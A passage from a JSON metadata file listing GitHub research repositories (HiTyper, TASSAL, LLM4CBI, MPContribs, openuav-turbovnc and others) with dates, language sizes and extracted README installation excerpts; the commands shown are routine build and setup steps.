                    "value": "You can use the following command to reproduce the above results:\n```sh\nhityper eval -g ManyTypes4Py_gts_test_verified.json -c ManyTypes4Py_gts_test_verified_detailed.json -u ManyTypes4Py_test_usertypes.json \n```\n \nIf you want to evaluate HiTyper on other datasets, please generate files with the same format with `ManyTypes4Py_gts_test_verified.json`, `ManyTypes4Py_gts_test_verified_detailed.json`, or you can modify the code in `__main__.py`. To check a type's category, you can use `hityper.typeobject.TypeObject.checkType()`. \nIn any case, you must also prepare the source files for static analysis. \n",
                    "original_header": "Experiment Results"
                },
                "confidence": 0.9863543319437548,
                "technique": "supervised_classification",
                "source": "https://raw.githubusercontent.com/JohnnyPeng18/HiTyper/main/README.md"
            },
            {
                "result": {
                    "type": "Text_excerpt",
                    "value": "- Add supports for inter-procedural analysis\n- Add supports for types from third-party modules\n- Add supports for external function calls\n- Add supports for stub files\n \n",
                    "original_header": "Todo"
                },
                "confidence": 0.9613827113525354,
                "technique": "supervised_classification",
                "source": "https://raw.githubusercontent.com/JohnnyPeng18/HiTyper/main/README.md"
            }
        ],
        "date_created": [
            {
                "result": {
                    "value": "2022-02-04T17:47:43Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "date_updated": [
            {
                "result": {
                    "value": "2024-09-07T08:32:55Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "programming_languages": [
            {
                "result": {
                    "value": "Python",
                    "name": "Python",
                    "type": "Programming_language",
                    "size": 528081
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ]
    },
    "147": {
        "filename": "mast-group_tassal_2024-10-04.json",
        "code_repository": [
            {
                "result": {
                    "value": "https://github.com/mast-group/tassal",
                    "type": "Url"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "installation_instructions": [
            {
                "result": {
                    "value": "Simply import as a maven project into [Eclipse](https://eclipse.org/) using the *File -> Import...* menu option (note that this requires [m2eclipse](http://eclipse.org/m2e/)). \n\nIt's also possible to export a runnable jar from Eclipse using the *File -> Export...* menu option.\n",
                    "type": "Text_excerpt",
                    "original_header": "Installing in Eclipse",
                    "parent_header": [
                        "TASSAL: Tree-based Autofolding Software Summarization ALgorithm <a href=\"https://travis-ci.org/mast-group/tassal\"><img alt=\"Build Status\" src=\"https://travis-ci.org/mast-group/tassal.svg?branch=master\" /></a>",
                        "Installation"
                    ]
                },
                "confidence": 1,
                "technique": "header_analysis",
                "source": "https://raw.githubusercontent.com/mast-group/tassal/master/README.md"
            },
            {
                "result": {
                    "value": "To compile a standalone runnable jar, simply run\n\n```\nmvn package\n```\n\nin the main tassal directory (note that this requires [maven](https://maven.apache.org/)).\n\nThis will create the standalone runnable jar ```tassal-1.1-SNAPSHOT.jar``` in the tassal/target subdirectory.\n",
                    "type": "Text_excerpt",
                    "original_header": "Compiling a Runnable Jar",
                    "parent_header": [
                        "TASSAL: Tree-based Autofolding Software Summarization ALgorithm <a href=\"https://travis-ci.org/mast-group/tassal\"><img alt=\"Build Status\" src=\"https://travis-ci.org/mast-group/tassal.svg?branch=master\" /></a>",
                        "Installation"
                    ]
                },
                "confidence": 1,
                "technique": "header_analysis",
                "source": "https://raw.githubusercontent.com/mast-group/tassal/master/README.md"
            },
            {
                "result": {
                    "type": "Text_excerpt",
                    "value": "**NEW:** For a live demo of TASSAL that allows you to summarize any GitHub project see:   \nhttps://code-summarizer.herokuapp.com \n",
                    "original_header": "TASSAL: Tree-based Autofolding Software Summarization ALgorithm <a href=\"https://travis-ci.org/mast-group/tassal\"><img alt=\"Build Status\" src=\"https://travis-ci.org/mast-group/tassal.svg?branch=master\" /></a>"
                },
                "confidence": 0.998232558216727,
                "technique": "supervised_classification",
                "source": "https://raw.githubusercontent.com/mast-group/tassal/master/README.md"
            },
            {
                "result": {
                    "type": "Text_excerpt",
                    "value": "* **-s** &nbsp;  working directory where the topic model creates necessary files (same as above)\n* **-d** &nbsp;  directory containing java projects\n* **-p** &nbsp;  project to summarize\n* **-c** &nbsp;  desired compression ratio (% of project files to list)\n* **-b** &nbsp;  (optional)  background topic to back off to (0-2, default=2) \n* **-o** &nbsp;  (optional)  where to save the salient files\n* **-i** &nbsp;  (optional)  whether to ignore unit test files (default=true)  \n",
                    "original_header": "Summarizing a Project"
                },
                "confidence": 0.9996036762194547,
                "technique": "supervised_classification",
                "source": "https://raw.githubusercontent.com/mast-group/tassal/master/README.md"
            },
            {
                "result": {
                    "type": "Text_excerpt",
                    "value": "Please report any bugs using GitHub's issue tracker.\n \n",
                    "original_header": "Bugs"
                },
                "confidence": 0.9946171779528844,
                "technique": "supervised_classification",
                "source": "https://raw.githubusercontent.com/mast-group/tassal/master/README.md"
            }
        ],
        "date_created": [
            {
                "result": {
                    "value": "2014-12-17T17:00:36Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "date_updated": [
            {
                "result": {
                    "value": "2024-01-06T16:11:40Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "programming_languages": [
            {
                "result": {
                    "value": "Java",
                    "name": "Java",
                    "type": "Programming_language",
                    "size": 593723
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ]
    },
    "148": {
        "filename": "setu1421_Secret-Management-Practices-Grey-Literature-Review-Dataset_2024-10-03.json",
        "code_repository": [
            {
                "result": {
                    "value": "https://github.com/setu1421/Secret-Management-Practices-Grey-Literature-Review-Dataset",
                    "type": "Url"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "installation_instructions": "No installation instructions found.",
        "date_created": [
            {
                "result": {
                    "value": "2022-08-23T19:38:47Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "date_updated": [
            {
                "result": {
                    "value": "2022-08-23T19:42:23Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "programming_languages": "No programming languages found."
    },
    "149": {
        "filename": "rosin-project_metacontrol_sim_2024-10-03.json",
        "code_repository": [
            {
                "result": {
                    "value": "https://github.com/rosin-project/metacontrol_sim",
                    "type": "Url"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "installation_instructions": [
            {
                "result": {
                    "value": "In the following instructions we assume that the ROS workspace is called `metacontrol_ws`, but you can give it any name you want.\n\n```console\nmkdir -p ~/metacontrol_ws/src\ncd ~/metacontrol_ws\nwstool init src https://raw.githubusercontent.com/rosin-project/metacontrol_sim/master/metacontrol_sim.rosinstall\nrosdep install --from-paths ./src -y -i -r --skip-keys=\"abb_rws_interface\"\ncatkin b\nsource devel/setup.bash\n```\n",
                    "type": "Text_excerpt",
                    "original_header": "Setup using wstool",
                    "parent_header": [
                        "Metacontrol simulation"
                    ]
                },
                "confidence": 1,
                "technique": "header_analysis",
                "source": "https://raw.githubusercontent.com/rosin-project/metacontrol_sim/master/README.md"
            },
            {
                "result": {
                    "type": "Text_excerpt",
                    "value": "The code can be built using the standard `catkin build` process.\n```console\ncd ~/metacontrol_ws\nsource /opt/ros/melodic/setup.bash\ncatkin build\nsource devel/setup.bash\n```\n \n",
                    "original_header": "Build the code"
                },
                "confidence": 0.9999999998651958,
                "technique": "supervised_classification",
                "source": "https://raw.githubusercontent.com/rosin-project/metacontrol_sim/master/README.md"
            }
        ],
        "date_created": [
            {
                "result": {
                    "value": "2020-04-06T14:20:35Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "date_updated": [
            {
                "result": {
                    "value": "2023-11-07T08:53:51Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "programming_languages": [
            {
                "result": {
                    "value": "Python",
                    "name": "Python",
                    "type": "Programming_language",
                    "size": 17301
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "CMake",
                    "name": "CMake",
                    "type": "Programming_language",
                    "size": 7172
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ]
    },
    "150": {
        "filename": "haoxintu_LLM4CBI_2024-10-04.json",
        "code_repository": [
            {
                "result": {
                    "value": "https://github.com/haoxintu/LLM4CBI",
                    "type": "Url"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "installation_instructions": [
            {
                "result": {
                    "value": "* Operating System: Ubuntu 18.04\n* Python version: 3.9.16\n* Torch version 1.4.0\n",
                    "type": "Text_excerpt",
                    "original_header": "Experimental environment",
                    "parent_header": [
                        "LLM4CBI",
                        "Setup Instructions"
                    ]
                },
                "confidence": 1,
                "technique": "header_analysis",
                "source": "https://raw.githubusercontent.com/haoxintu/LLM4CBI/main/README.md"
            },
            {
                "result": {
                    "value": "```\n# To isolate GCC bugs for example\n$ cd llm4cbi-gcc\n$ python setup-gcc.py\n```\n\nWe provide the required compiler version in the file `llvmbug.txt` and `gccbugs.txt`. An example of this format shown in gccbugs.txt is as follows:\n\n ```\n57303,r198967,-O0,-O1,checkIsPass_wrongcodeOneline,install_no\n```\n\n* `57303` is the bug ID in the [GCC bug repository](https://gcc.gnu.org/bugzilla/).\n* `r198967` is the buggy version on SVN.\n* `-O0,-O1` are correct and wrong optimization options.\n* `checkIsPass_wrongcodeOneline` is the test oracle checking, please refer to the description [here]( https://github.com/haoyang9804/RecBi/tree/master?tab=readme-ov-file#deploying--1--preparing-for-installing-target-llvm-trunk).\n* `install_no` means this LLVM trunk has not been installed while `install_yes` means the opposite.\n",
                    "type": "Text_excerpt",
                    "original_header": "Step 1: Build compilers with coverage profilers (i.e.,`gcov`)",
                    "parent_header": [
                        "LLM4CBI",
                        "Setup Instructions"
                    ]
                },
                "confidence": 1,
                "technique": "header_analysis",
                "source": "https://raw.githubusercontent.com/haoxintu/LLM4CBI/main/README.md"
            }
        ],
        "date_created": [
            {
                "result": {
                    "value": "2023-06-29T07:13:34Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "date_updated": [
            {
                "result": {
                    "value": "2024-08-06T08:05:17Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "programming_languages": [
            {
                "result": {
                    "value": "Python",
                    "name": "Python",
                    "type": "Programming_language",
                    "size": 232120
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "C",
                    "name": "C",
                    "type": "Programming_language",
                    "size": 45002
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "R",
                    "name": "R",
                    "type": "Programming_language",
                    "size": 10687
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "Shell",
                    "name": "Shell",
                    "type": "Programming_language",
                    "size": 3472
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ]
    },
    "151": {
        "filename": "materialsproject_MPContribs_2024-10-03.json",
        "code_repository": [
            {
                "result": {
                    "value": "https://github.com/materialsproject/MPContribs",
                    "type": "Url"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "installation_instructions": [
            {
                "result": {
                    "type": "Text_excerpt",
                    "value": "See https://mpcontribs.org\n \n"
                },
                "confidence": 0.9870537810119657,
                "technique": "supervised_classification",
                "source": "https://raw.githubusercontent.com/materialsproject/MPContribs/master/README.md"
            }
        ],
        "date_created": [
            {
                "result": {
                    "value": "2014-12-11T18:25:27Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "date_updated": [
            {
                "result": {
                    "value": "2024-09-30T17:10:57Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "programming_languages": [
            {
                "result": {
                    "value": "Jupyter Notebook",
                    "name": "Jupyter Notebook",
                    "type": "Programming_language",
                    "size": 405767
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "Python",
                    "name": "Python",
                    "type": "Programming_language",
                    "size": 373571
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "HTML",
                    "name": "HTML",
                    "type": "Programming_language",
                    "size": 93373
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "JavaScript",
                    "name": "JavaScript",
                    "type": "Programming_language",
                    "size": 86691
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "Dockerfile",
                    "name": "Dockerfile",
                    "type": "Programming_language",
                    "size": 7348
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "Jinja",
                    "name": "Jinja",
                    "type": "Programming_language",
                    "size": 4619
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "SCSS",
                    "name": "SCSS",
                    "type": "Programming_language",
                    "size": 4141
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "Shell",
                    "name": "Shell",
                    "type": "Programming_language",
                    "size": 2997
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "Makefile",
                    "name": "Makefile",
                    "type": "Programming_language",
                    "size": 1682
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ]
    },
    "152": {
        "filename": "microsoft_DataScienceProblems_2024-10-03.json",
        "code_repository": [
            {
                "result": {
                    "value": "https://github.com/microsoft/DataScienceProblems",
                    "type": "Url"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "installation_instructions": [
            {
                "result": {
                    "value": "This project requires Python 3.6+ and Docker to run. Assuming you have these, to get started first download and install the Python package:\n\n```\n$ git clone git@github.com:microsoft/DataScienceProblems.git\n$ cd DataScienceProblems/src\n$ pip install -e .\n```\n",
                    "type": "Text_excerpt",
                    "original_header": "Installation",
                    "parent_header": [
                        "Data Science Problems"
                    ]
                },
                "confidence": 1,
                "technique": "header_analysis",
                "source": "https://raw.githubusercontent.com/microsoft/DataScienceProblems/main/README.md"
            }
        ],
        "date_created": [
            {
                "result": {
                    "value": "2021-09-08T20:21:32Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "date_updated": [
            {
                "result": {
                    "value": "2024-09-19T20:27:23Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "programming_languages": [
            {
                "result": {
                    "value": "Python",
                    "name": "Python",
                    "type": "Programming_language",
                    "size": 16568
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "Dockerfile",
                    "name": "Dockerfile",
                    "type": "Programming_language",
                    "size": 168
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ]
    },
    "153": {
        "filename": "mojtaba-eshghie_SolidityDesignPatternsDCRGraph_2024-10-04.json",
        "code_repository": [
            {
                "result": {
                    "value": "https://github.com/mojtaba-eshghie/SmartContractDesignPatternsInDCRGraphs",
                    "type": "Url"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "installation_instructions": "No installation instructions found.",
        "date_created": [
            {
                "result": {
                    "value": "2023-03-12T09:18:53Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "date_updated": [
            {
                "result": {
                    "value": "2024-09-19T08:01:55Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "programming_languages": [
            {
                "result": {
                    "value": "Shell",
                    "name": "Shell",
                    "type": "Programming_language",
                    "size": 154
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ]
    },
    "154": {
        "filename": "nuest_rockerverse-paper_2024-10-03.json",
        "code_repository": [
            {
                "result": {
                    "value": "https://github.com/nuest/rockerverse-paper",
                    "type": "Url"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "installation_instructions": [
            {
                "result": {
                    "type": "Text_excerpt",
                    "value": "- `rize`, because discontinued, see #35\n- `docker` ([https://bhaskarvk.github.io/docker](https://bhaskarvk.github.io/docker) has been removed from CRAN, seems unmaintained by authors\n- https://github.com/svlentink/dockerfiles/blob/master/svlentink/r-base-alpine/Dockerfile because the Alpine image is quite a trivial one\n- https://github.com/jlisic/R-docker-centos because CentOS images are also provided by R-hub\n- `sevenbridges` includes several Dockerfiles and documentation about using images, and also seems to use Docker in the built workflows but via other tools, not directly, https://sbg.github.io/sevenbridges-r/, https://github.com/sbg/sevenbridges-r/search?p=4&q=docker&unscoped_q=docker\n- https://github.com/rocker-jp because it seems to have stalled soon after inception\n- https://github.com/thomasp85/fiery because no examples/docs for Docker (though probably trivial anyway)\n- [RStudio Connect](https://rstudio.com/products/connect/) because while it does use a similar mechanism to seperate processes, it does _not_ use Docker and the comparison would require a lot of background explanation, and not all details are available because the software is proprietary\n- https://github.com/ecohealthalliance/reservoir is an invididual specific data science image container for a group - add if it fits\n- https://itsalocke.com/blog/building-an-r-training-environment/ (one single container for many users in teaching, uses rocker/tidyverse)\n \n",
                    "original_header": "Not included projects and packages"
                },
                "confidence": 0.9999859395080068,
                "technique": "supervised_classification",
                "source": "https://raw.githubusercontent.com/nuest/rockerverse-paper/master/README.md"
            },
            {
                "result": {
                    "type": "Text_excerpt",
                    "value": "```{r preprint_pdf, eval=FALSE, include=FALSE}\n# run this chunk, get the PDF, then revert changes in touched files\nlibrary(\"rmarkdown\")\nlibrary(\"rticles\")\nunlink('manuscript_cache', recursive = TRUE)\n\n# function is a copy of rticles::rjournal_article() but...\n# - using RJWrapper_preprint_template.tex (which includes header.tex commands)\n# - directly referencing unexported functions from rticles\n# - direclty setting the keep_tex option\nrjournal_style_preprint <- function (..., citation_package = \"natbib\") {\n    rmarkdown::pandoc_available(\"2.2\", TRUE)\n    base <- rticles:::pdf_document_format(\"rjournal_article\", highlight = NULL,\n        citation_package = citation_package, ...)\n    base$pandoc$to <- \"latex\"\n    base$pandoc$ext <- \".tex\"\n    base$pandoc$keep_tex <- TRUE # added\n    base$post_processor <- function(metadata, utf8_input, output_file,\n        clean, verbose) {\n      filename <- basename(output_file)\n      if (filename != (filename2 <- gsub(\"_\", \"-\", filename))) {\n          file.rename(filename, filename2)\n          filename <- filename2\n      }\n      m <- list(filename = xfun::sans_ext(filename))\n      h <- rticles:::get_list_element(metadata, c(\"output\", \"rticles::rjournal_article\",\n          \"includes\", \"in_header\"))\n      h <- c(h, if (length(preamble <- unlist(metadata[c(\"preamble\",\n          \"header-includes\")]))) {\n          f <- tempfile(fileext = \".tex\")\n          on.exit(unlink(f), add = TRUE)\n          xfun::write_utf8(preamble, f)\n          f\n      })\n      #t <- find_resource(\"rjournal_article\", \"RJwrapper.tex\")\n      t <- here::here(\"RJwrapper_preprint_template.tex\")\n      rticles:::template_pandoc(m, t, \"RJwrapper.tex\", h, verbose)\n      tinytex::latexmk(\"RJwrapper.tex\", base$pandoc$latex_engine,\n          clean = clean)\n    }\n    base$knitr$opts_chunk$comment <- \"#>\"\n    hilight_source <- rticles:::knitr_fun(\"hilight_source\")\n    hook_chunk = function(x, options) {\n        if (rticles:::output_asis(x, options))\n            return(x)\n        paste0(\"```{=latex}\\n\\\\begin{Schunk}\\n\", x, \"\\\\end{Schunk}\\nBASH3*\n```{r collab_emails, eval=FALSE, include=FALSE}\nfront_matter <- rmarkdown::yaml_front_matter(\"rockerverse.Rmd\")\nemails <- sapply(X = front_matter$author, FUN = function(a) { a$email })\ncat(emails, sep = \"\\n\")\n```\n```{bash collab_handles, eval=FALSE, include=FALSE}\ncat rockerverse.Rmd | grep '    # https://github.com/' | sed 's|    # https://github.com/|@|'\n```\n```{r submission_zipfile, eval=FALSE, include=FALSE}\n# Please upload a zip file of the directory containing a motivating letter (in PDF format) if required, the sources of your article; the *.tex, *.bib and *.R files should have the same file name before the extension, which should be your last or family name in lower-case letters, or the last or family names of the authors joined using hyphens. Your title should not include dashes or hyphens. Make sure to also include RJwrapper.tex and RJwrapper.pdf. \nzip::zip(\"rockerverse.zip\", c(\"rockerverse.tex\",\n                              \"rockerverse.bib\",\n                              \"rockerverse.R\",\n                              \"figures/orcid.pdf\",\n                              \"figures/Rlogo.pdf\",\n                              \"RJwrapper.tex\",\n                              \"RJwrapper.pdf\"))\n```\n \n",
                    "original_header": "Helpers"
                },
                "confidence": 0.9111864250734472,
                "technique": "supervised_classification",
                "source": "https://raw.githubusercontent.com/nuest/rockerverse-paper/master/README.md"
            }
        ],
        "date_created": [
            {
                "result": {
                    "value": "2017-10-03T12:41:47Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "date_updated": [
            {
                "result": {
                    "value": "2024-02-03T17:00:23Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "programming_languages": [
            {
                "result": {
                    "value": "TeX",
                    "name": "TeX",
                    "type": "Programming_language",
                    "size": 157210
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "R",
                    "name": "R",
                    "type": "Programming_language",
                    "size": 3162
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "Dockerfile",
                    "name": "Dockerfile",
                    "type": "Programming_language",
                    "size": 535
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ]
    },
    "155": {
        "filename": "myxxxsquared_OrdinalFix_2024-10-04.json",
        "code_repository": [
            {
                "result": {
                    "value": "https://github.com/myxxxsquared/OrdinalFix",
                    "type": "Url"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "installation_instructions": [
            {
                "result": {
                    "value": "```bash\ncargo build --release\n```\n",
                    "type": "Text_excerpt",
                    "original_header": "Build",
                    "parent_header": [
                        "OrdinalFix: Fixing Compilation Errors via Shortest-Path CFL Reachability"
                    ]
                },
                "confidence": 1,
                "technique": "header_analysis",
                "source": "https://raw.githubusercontent.com/myxxxsquared/OrdinalFix/master/README.md"
            }
        ],
        "date_created": [
            {
                "result": {
                    "value": "2023-08-15T03:49:30Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "date_updated": [
            {
                "result": {
                    "value": "2023-11-29T17:42:07Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "programming_languages": [
            {
                "result": {
                    "value": "Rust",
                    "name": "Rust",
                    "type": "Programming_language",
                    "size": 399962
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "Python",
                    "name": "Python",
                    "type": "Programming_language",
                    "size": 42755
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "C",
                    "name": "C",
                    "type": "Programming_language",
                    "size": 591
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ]
    },
    "156": {
        "filename": "Open-UAV_openuav-turbovnc_2024-10-04.json",
        "code_repository": [
            {
                "result": {
                    "value": "https://github.com/Open-UAV/openuav-turbovnc",
                    "type": "Url"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "installation_instructions": [
            {
                "result": {
                    "type": "Text_excerpt",
                    "value": "1. Spin up a GC GPU host on the google console. Make sure it has at least one Tesla K80 GPU, and decent amount of VCPUs (e.g. 4, and enough disk space, at least 50Gb). Zone `us-east-1c` seems to be the best choice as of April 1, 2018.\n2. Upload this repo and unpack it in `/root/build` or wherever you like as a temporary location.\n3. Run `preinstall.sh`. This just runs `apt-get update` and puts in `screen` and `emacs` for getting started.\n4. Run `build.sh`. This will build everything needed to start up a nvidia-docker2 container with Ubuntu 18.04 and Lubuntu desktop.\n \n",
                    "original_header": "Building a plain vanilla Google Compute GPU host"
                },
                "confidence": 0.9999999994215614,
                "technique": "supervised_classification",
                "source": "https://raw.githubusercontent.com/Open-UAV/openuav-turbovnc/master/README.md"
            },
            {
                "result": {
                    "type": "Text_excerpt",
                    "value": "1. Run `nvidia-xconfig --query-gpu-info` and modify the `autonomous_sys_build/xorg.conf` with your GPU's BusId and name.\n2. Run `preinstall.sh`. This runs `apt-get update` and puts in `screen` and `emacs` for getting started.\n3. Run `build.sh`. This will build everything needed to start up a nvidia-docker2 container with Ubuntu 18.04 and Lubuntu desktop.\n \n",
                    "original_header": "Building on a local machine with GPU"
                },
                "confidence": 0.9999999999988063,
                "technique": "supervised_classification",
                "source": "https://raw.githubusercontent.com/Open-UAV/openuav-turbovnc/master/README.md"
            },
            {
                "result": {
                    "type": "Text_excerpt",
                    "value": "1. There are 3 docker images created after running `build.sh`, \n   - openuav:base-cuda-10.2-ubuntu18.04 \n   - openuav:ros-cuda-10.2-ubuntu18.04\n   - openuav:px4-cuda-10.2-ubuntu18.04 \n  The first image contains a basic linux ubuntu 18.04 desktop with chrome and pycharm installed. These session are used for python programming courses and can avoid any of the GPU requirements (change the base image in Dockerfile.base to `nvidia/opengl:1.0-glvnd-runtime`). Second image is a robotics specific image that contains ros melodic and gazebo 9.0.0 installed. The third image installs all the necessary PX4 and QGroundControl software to do flight simulations.  \n2. To access, containers through the sub-domain based url, you need to setup a dns proxy to obtain the docker internal DNS for routing. This can be achieved by creating a reverse proxy NginX container, that serves the internal DNS to host machine. \n   - Create a docker network for openuav containers, `docker network create -d bridge cpsvo`.\n   - Create a docker NginX container. Command is `docker run --name dns-proxy --network=cpsvo -d nginx`.\n   - Enter the nginx container, install vim/nano (for editing nginx.conf file) and net-tools. (`apt update && apt install vim net-tools`)\n   - Replace the NginX containers `/etc/nginx/nginx.conf` with the following conf. This provides docker DNS to host machine (127.0.0.11 from inside docker) \n      ```\n      user  nginx;\n      worker_processes  1;\n\n      error_log  /var/log/nginx/error.log warn;\n      pid        /var/run/nginx.pid;\n\n\n      events {\n          worker_connections  1024;\n      }\n\n\n      http {\n          include       /etc/nginx/mime.types;\n          default_type  application/octet-stream;\n\n          log_format  main  '$remote_addr - $remote_user [$time_local] \"$request\" '\n                            '$status $body_bytes_sent \"$http_referer\" '\n                            '\"$http_user_agent\" \"$http_x_forwarded_for\"';\n\n          access_log  /var/log/nginx/access.log  main;\n\n          sendfile        on;\n          #tcp_nopush     on;\n\n          keepalive_timeout  65;\n\n          #gzip  on;\n\n          include /etc/nginx/conf.d/*.conf;\n      }\n      stream {\n         upstream ssh_openuav {\n             server 127.0.0.11:53;\n         }\n         server {\n             listen        53 udp;\n             proxy_pass    ssh_openuav;\n\n         }\n      }\n      ```\n   - Install NginX on the host machine and modify the `/etc/nginx/sites-enabled/default` file to include the following server configuration. \n     You should replace `\\.openuav\\.us$;` with your domain name and the cpsvo in the beginning can be replaced with a any other name. You must \n     also replace 172.18.0.2 in `resolver 172.18.0.2 valid=2s;` to the IP address of the NginX container (`docker inspect -f '{{range .NetworkSettings.Networks}}{{.IPAddress}}{{end}}' dns-proxy`). You must also replace the ssl_certificate and ssl_certificate_key variables with your variables.\n       BASH2*\n \n",
                    "original_header": "Further details"
                },
                "confidence": 0.996757592476485,
                "technique": "supervised_classification",
                "source": "https://raw.githubusercontent.com/Open-UAV/openuav-turbovnc/master/README.md"
            },
            {
                "result": {
                    "type": "Text_excerpt",
                    "value": "1. In the local setup, if you switch users in the local machine the containers have to be restarted to update for Xorg changes.\n   A fix for this is to run the xserver on a GPU specifically used for OpenUAV work. (for more details https://openuav.us/#onpremise )   \n   ```\n   /usr/lib/xorg/Xorg -core :1 -seat seat1 -auth /var/run/lightdm/root/:1 -nolisten tcp vt8 -novtswitch -config /etc/X11/xorg.conf.openuav\n   ```\n2. Working with AMD GPUs (https://github.com/Open-UAV/openuav-turbovnc/issues/29)\n3. GLX issues \n    If you are facing GLX issues, try checking X server running at (`:0.0`) with GPU support is connected properly. You can pass a host X server with GPU ti the inside of the container as `/tmp/X11-unix/X0`. This connection is usually the issue for most GLX problems. \n",
                    "original_header": "Known issues"
                },
                "confidence": 0.9993328286026852,
                "technique": "supervised_classification",
                "source": "https://raw.githubusercontent.com/Open-UAV/openuav-turbovnc/master/README.md"
            },
            {
                "result": {
                    "type": "Text_excerpt",
                    "value": "1. You can try our https://hub.docker.com/r/dreamslab/openuav image to setup the system (GCP K80 GPU), it's recommended to use `build.sh`.\n \n",
                    "original_header": "DockerHub Image"
                },
                "confidence": 0.9999992088480386,
                "technique": "supervised_classification",
                "source": "https://raw.githubusercontent.com/Open-UAV/openuav-turbovnc/master/README.md"
            }
        ],
        "date_created": [
            {
                "result": {
                    "value": "2019-07-04T01:11:46Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "date_updated": [
            {
                "result": {
                    "value": "2024-09-08T08:55:12Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "programming_languages": [
            {
                "result": {
                    "value": "QML",
                    "name": "QML",
                    "type": "Programming_language",
                    "size": 2734351
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "Python",
                    "name": "Python",
                    "type": "Programming_language",
                    "size": 76041
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "Shell",
                    "name": "Shell",
                    "type": "Programming_language",
                    "size": 16896
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "JavaScript",
                    "name": "JavaScript",
                    "type": "Programming_language",
                    "size": 13629
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "HTML",
                    "name": "HTML",
                    "type": "Programming_language",
                    "size": 477
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ]
    },
    "157": {
        "filename": "soarsmu_TOSEM-DBRD_2024-10-03.json",
        "code_repository": [
            {
                "result": {
                    "value": "https://github.com/soarsmu/TOSEM-DBRD",
                    "type": "Url"
                },
                "confidence": 1,
